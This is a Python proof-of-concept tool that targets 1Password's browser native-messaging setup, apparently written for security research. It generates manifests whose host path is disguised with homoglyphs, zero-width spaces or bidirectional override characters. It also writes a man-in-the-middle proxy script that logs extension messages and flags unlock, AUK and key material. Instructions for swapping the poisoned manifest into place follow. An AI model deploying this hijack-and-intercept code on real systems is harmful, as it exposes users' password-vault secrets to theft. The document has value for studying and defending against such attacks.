#!/usr/bin/env python3
"""
Native Messaging Manifest Fuzzer
Tests how browsers handle Unicode in manifest paths

This tests the critical question: Does Chrome/Firefox normalize 
the path before executing, or pass it raw to the OS?
"""

import json
import os
import sys
import platform
import argparse
import shutil
import subprocess
from pathlib import Path
from typing import Optional, Dict, List

from homoglyph_map import to_greek, to_cyrillic, to_mixed, inject_zwsp, BIDI_OVERRIDES


# Platform-specific manifest locations
MANIFEST_LOCATIONS = {
    "Darwin": {  # macOS
        "chrome": [
            "~/Library/Application Support/Google/Chrome/NativeMessagingHosts",
            "/Library/Google/Chrome/NativeMessagingHosts",
        ],
        "firefox": [
            "~/Library/Application Support/Mozilla/NativeMessagingHosts",
            "/Library/Application Support/Mozilla/NativeMessagingHosts",
        ],
    },
    "Linux": {
        "chrome": [
            "~/.config/google-chrome/NativeMessagingHosts",
            "/etc/opt/chrome/native-messaging-hosts",
        ],
        "firefox": [
            "~/.mozilla/native-messaging-hosts",
            "/usr/lib/mozilla/native-messaging-hosts",
        ],
    },
    "Windows": {
        "chrome": [
            # Registry-based, manifest path stored in:
            # HKCU\Software\Google\Chrome\NativeMessagingHosts\{name}
        ],
        "firefox": [
            # Registry-based
        ],
    },
}

# 1Password's known manifest name
MANIFEST_NAME = "com.1password.1password.json"

# 1Password's extension IDs
EXTENSION_IDS = {
    "chrome": "chrome-extension://aeblfdkhhhdcdjpifhhbdiojplfjncoa/",
    "firefox": "{d634138d-c276-4fc8-924b-40a0ea21d284}",
}


def find_manifests() -> Dict[str, List[Path]]:
    """Find all native messaging manifest directories"""
    
    system = platform.system()
    found = {"chrome": [], "firefox": []}
    
    if system not in MANIFEST_LOCATIONS:
        print(f"Unsupported platform: {system}")
        return found
    
    for browser, paths in MANIFEST_LOCATIONS[system].items():
        for path_str in paths:
            path = Path(os.path.expanduser(path_str))
            if path.exists():
                found[browser].append(path)
                manifest = path / MANIFEST_NAME
                if manifest.exists():
                    print(f"✅ Found {browser} manifest: {manifest}")
                else:
                    print(f"📁 Found {browser} dir (no 1Password manifest): {path}")
    
    return found


def read_manifest(manifest_path: Path) -> Optional[Dict]:
    """Read and parse a native messaging manifest"""
    try:
        with open(manifest_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error reading {manifest_path}: {e}")
        return None


def generate_poisoned_manifests(original_manifest: Dict, output_dir: Path) -> List[Path]:
    """Generate manifests with homoglyph paths"""
    
    original_path = original_manifest.get("path", "")
    if not original_path:
        print("No path in manifest!")
        return []
    
    output_dir.mkdir(parents=True, exist_ok=True)
    generated = []
    
    # Different poisoning strategies
    strategies = [
        ("greek_P", lambda p: p.replace("P", "Ρ").replace("p", "ρ")),
        ("cyrillic_a", lambda p: p.replace("a", "а")),
        ("mixed_all", to_mixed),
        ("zwsp_after_1", lambda p: p.replace("1P", "1\u200BP")),
        ("rlo_wrap", lambda p: f"\u202e{p[::-1]}\u202c"),  # Reverse display
    ]
    
    for name, transform in strategies:
        poisoned_path = transform(original_path)
        
        # Skip if no change
        if poisoned_path == original_path:
            continue
        
        manifest = original_manifest.copy()
        manifest["path"] = poisoned_path
        
        output_file = output_dir / f"poisoned_{name}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(manifest, f, indent=2, ensure_ascii=False)
        
        print(f"\n📝 Generated: {output_file}")
        print(f"   Original: {original_path}")
        print(f"   Poisoned: {poisoned_path}")
        print(f"   Bytes:    {poisoned_path.encode('utf-8').hex()[:60]}...")
        
        generated.append(output_file)
    
    return generated


def create_test_binary(output_path: Path) -> None:
    """Create a test binary that logs when executed"""
    
    script = '''#!/usr/bin/env python3
"""
MITM Proxy for 1Password Native Messaging
Logs all messages, forwards to real binary
"""

import sys
import os
import json
import struct
import logging
from datetime import datetime

# Configure logging
LOG_FILE = "/tmp/1password_intercept.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s'
)

# Path to REAL 1Password binary (you must set this)
REAL_BINARY = os.environ.get("REAL_1PASSWORD_PATH", "/usr/bin/1Password-BrowserSupport")

def log(msg):
    logging.info(msg)
    # Also write to stderr for debugging
    sys.stderr.write(f"[PROXY] {msg}\\n")
    sys.stderr.flush()

def read_native_message():
    """Read length-prefixed JSON from stdin"""
    raw_length = sys.stdin.buffer.read(4)
    if not raw_length:
        return None
    length = struct.unpack('=I', raw_length)[0]
    message = sys.stdin.buffer.read(length)
    return json.loads(message.decode('utf-8'))

def write_native_message(message):
    """Write length-prefixed JSON to stdout"""
    encoded = json.dumps(message).encode('utf-8')
    sys.stdout.buffer.write(struct.pack('=I', len(encoded)))
    sys.stdout.buffer.write(encoded)
    sys.stdout.buffer.flush()

log("=" * 60)
log("1PASSWORD PROXY STARTED")
log(f"Real binary: {REAL_BINARY}")
log(f"PID: {os.getpid()}")
log("=" * 60)

# For now, just log that we were executed
# Full proxy implementation would subprocess to real binary
log("INTERCEPTION SUCCESSFUL - Extension connected to proxy!")

# Read and log first message
try:
    msg = read_native_message()
    log(f"RECEIVED: {json.dumps(msg, indent=2)}")
    
    # Look for sensitive data
    msg_str = json.dumps(msg)
    if "unlock" in msg_str.lower():
        log("🔑 UNLOCK MESSAGE DETECTED!")
    if "auk" in msg_str.lower():
        log("🎯 AUK DETECTED!")
    if "key" in msg_str.lower():
        log("🔐 KEY MATERIAL DETECTED!")
        
except Exception as e:
    log(f"ERROR: {e}")

# For testing, send error response so extension knows something's wrong
error_response = {
    "error": "Proxy test - not forwarding to real 1Password"
}
write_native_message(error_response)

log("Proxy test complete")
'''
    
    with open(output_path, 'w') as f:
        f.write(script)
    
    os.chmod(output_path, 0o755)
    print(f"✅ Created test binary: {output_path}")


def test_browser_parsing(manifest_path: Path) -> bool:
    """
    Test if browser accepts a manifest with non-ASCII path
    
    This is a manual test - we can't directly invoke browser parsing,
    but we can:
    1. Install manifest
    2. Reload extension
    3. Check if extension connects to our binary
    """
    
    print("\n" + "=" * 60)
    print("BROWSER PARSING TEST")
    print("=" * 60)
    print("""
This test requires manual steps:

1. Backup original manifest
2. Replace with poisoned manifest
3. Reload 1Password extension (or restart browser)
4. Check /tmp/1password_intercept.log for connection
5. Restore original manifest

Would you like to proceed? This modifies system files!
""")
    
    return True  # Placeholder - implement interactive flow


def main():
    parser = argparse.ArgumentParser(description="1Password Native Messaging Fuzzer")
    parser.add_argument("--locate", action="store_true", help="Find manifest locations")
    parser.add_argument("--generate", action="store_true", help="Generate poisoned manifests")
    parser.add_argument("--output", type=str, default="./poisoned_manifests", help="Output directory")
    parser.add_argument("--test-binary", action="store_true", help="Create test proxy binary")
    
    args = parser.parse_args()
    
    if args.locate or not any([args.generate, args.test_binary]):
        print("Searching for native messaging manifests...\n")
        found = find_manifests()
        
        print("\n" + "=" * 60)
        print("SUMMARY")
        print("=" * 60)
        
        total = sum(len(v) for v in found.values())
        if total == 0:
            print("No native messaging directories found.")
            print("1Password may not be installed, or using different paths.")
        else:
            for browser, paths in found.items():
                print(f"\n{browser.upper()}:")
                for p in paths:
                    manifest = p / MANIFEST_NAME
                    if manifest.exists():
                        print(f"  ✅ {manifest}")
                        data = read_manifest(manifest)
                        if data:
                            print(f"     Path: {data.get('path', 'N/A')}")
                    else:
                        print(f"  📁 {p} (no 1Password manifest)")
    
    if args.generate:
        # Find first available manifest
        found = find_manifests()
        
        manifest_path = None
        for browser, paths in found.items():
            for p in paths:
                m = p / MANIFEST_NAME
                if m.exists():
                    manifest_path = m
                    break
            if manifest_path:
                break
        
        if not manifest_path:
            print("No 1Password manifest found to base poisoned versions on.")
            print("Creating template manifest...")
            
            template = {
                "name": "com.1password.1password",
                "description": "1Password",
                "path": "/usr/bin/1Password-BrowserSupport",
                "type": "stdio",
                "allowed_origins": [EXTENSION_IDS["chrome"]]
            }
            
            output_dir = Path(args.output)
            output_dir.mkdir(parents=True, exist_ok=True)
            
            template_path = output_dir / "template_manifest.json"
            with open(template_path, 'w') as f:
                json.dump(template, f, indent=2)
            
            print(f"Created template: {template_path}")
            manifest_path = template_path
        
        manifest = read_manifest(manifest_path)
        if manifest:
            generate_poisoned_manifests(manifest, Path(args.output))
    
    if args.test_binary:
        output_dir = Path(args.output)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        binary_path = output_dir / "proxy_binary.py"
        create_test_binary(binary_path)
        
        print("\nTo test:")
        print("1. Create homoglyph-named copy of this binary")
        print("2. Point poisoned manifest to it")
        print("3. Swap manifest and reload extension")
        print("4. Check /tmp/1password_intercept.log")


if __name__ == "__main__":
    main()
